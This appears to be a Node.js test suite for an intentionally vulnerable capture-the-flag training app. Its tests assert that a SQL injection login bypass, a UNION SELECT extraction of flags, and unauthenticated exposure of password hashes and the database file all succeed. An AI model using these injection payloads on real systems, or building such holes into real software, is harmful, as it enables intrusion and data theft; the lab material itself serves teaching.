'use strict';
const { test, describe, before, after } = require('node:test');
const assert = require('node:assert');
const request = require('supertest');
const { resetDb } = require('../db');

// Resetear la DB antes de cada ejecución para que los tests sean idempotentes
let app;
before(() => {
  resetDb();
  app = require('../server');
});

describe('Database seed', () => {
  test('usuarios seed cargado correctamente', async () => {
    const res = await request(app)
      .get('/api/users');
    assert.equal(res.status, 200);
    const usernames = res.body.users.map(u => u.username);
    assert.ok(usernames.includes('admin'));
    assert.ok(usernames.includes('prof_garcia'));
    assert.ok(usernames.includes('alumno_lopez'));
    assert.ok(usernames.includes('alumno_perez'));
  });
});

describe('Autenticación', () => {
  test('Login con credenciales válidas retorna rol y nombre', async () => {
    const res = await request(app)
      .post('/login')
      .send({ username: 'alumno_lopez', password: 'alumno123' });
    assert.equal(res.status, 200);
    assert.equal(res.body.rol, 'alumno');
    assert.ok(res.body.nombre);
  });

  test('Login con contraseña incorrecta retorna 401', async () => {
    const res = await request(app)
      .post('/login')
      .send({ username: 'alumno_lopez', password: 'wrong' });
    assert.equal(res.status, 401);
  });
});

describe('VULN 1 — SQL Injection en login', () => {
  test("Payload ' OR '1'='1' -- hace bypass y revela FLAG{sql_1nj3ct10n}", async () => {
    const res = await request(app)
      .post('/login')
      .send({ username: "' OR '1'='1' --", password: 'irrelevante' });
    assert.equal(res.status, 200);
    assert.equal(res.body.flag, 'FLAG{sql_1nj3ct10n}');
    assert.ok(res.body.debug, 'Debe incluir la query ejecutada');
  });
});

describe('VULN 1b — SQL Injection en /search (UNION SELECT)', () => {
  let cookie;
  before(async () => {
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('Búsqueda normal retorna usuarios', async () => {
    const res = await request(app).get('/search?q=Lopez').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.body.results));
    assert.ok(res.body.results.length > 0);
  });

  test('UNION SELECT extrae tabla flags y muestra FLAG{sql_1nj3ct10n}', async () => {
    const payload = encodeURIComponent("' UNION SELECT id, flag, flag, flag, flag FROM flags --");
    const res = await request(app).get(`/search?q=${payload}`).set('Cookie', cookie);
    assert.equal(res.status, 200);
    const valores = res.body.results.flatMap(r => Object.values(r));
    assert.ok(valores.some(v => String(v).includes('FLAG{')), 'La flag debe aparecer en los resultados');
  });

  test('/search sin sesión retorna 401', async () => {
    const res = await request(app).get('/search?q=test');
    assert.equal(res.status, 401);
  });
});

describe('VULN 6 — Exposición de datos sensibles', () => {
  test('/api/users retorna usuarios con hashes sin requerir autenticación', async () => {
    const res = await request(app).get('/api/users');
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.body.users));
    assert.ok(res.body.users.every(u => u.password), 'Los hashes deben estar expuestos');
    assert.equal(res.body.flag, 'FLAG{s3ns1t1v3_d4t4}');
  });

  test('/db.sqlite es descargable sin autenticación', async () => {
    const res = await request(app).get('/db.sqlite');
    assert.ok(res.status === 200 || res.status === 304);
  });
});
